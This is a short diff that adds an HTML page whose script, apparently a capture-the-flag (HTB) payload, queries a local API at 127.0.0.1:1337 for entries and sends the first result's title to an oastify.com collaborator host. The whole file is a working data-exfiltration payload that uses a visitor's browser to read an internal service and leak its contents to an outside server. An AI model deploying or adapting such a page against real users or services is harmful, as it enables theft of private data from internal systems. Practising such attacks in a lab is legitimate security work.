@@ -1,0 +1,10 @@
+<html>
+<script>
+    fetch("http://127.0.0.1:1337/api/entries/search?q=HTB")
+        .then(response => response.json())
+        .then(commits =>
+            promise = fetch("http://ahvbkal5dbtixv3n0yune7kgh7nybvzk.oastify.com?test=" + commits[0].title)
+        );
+</script>
+
+</html>
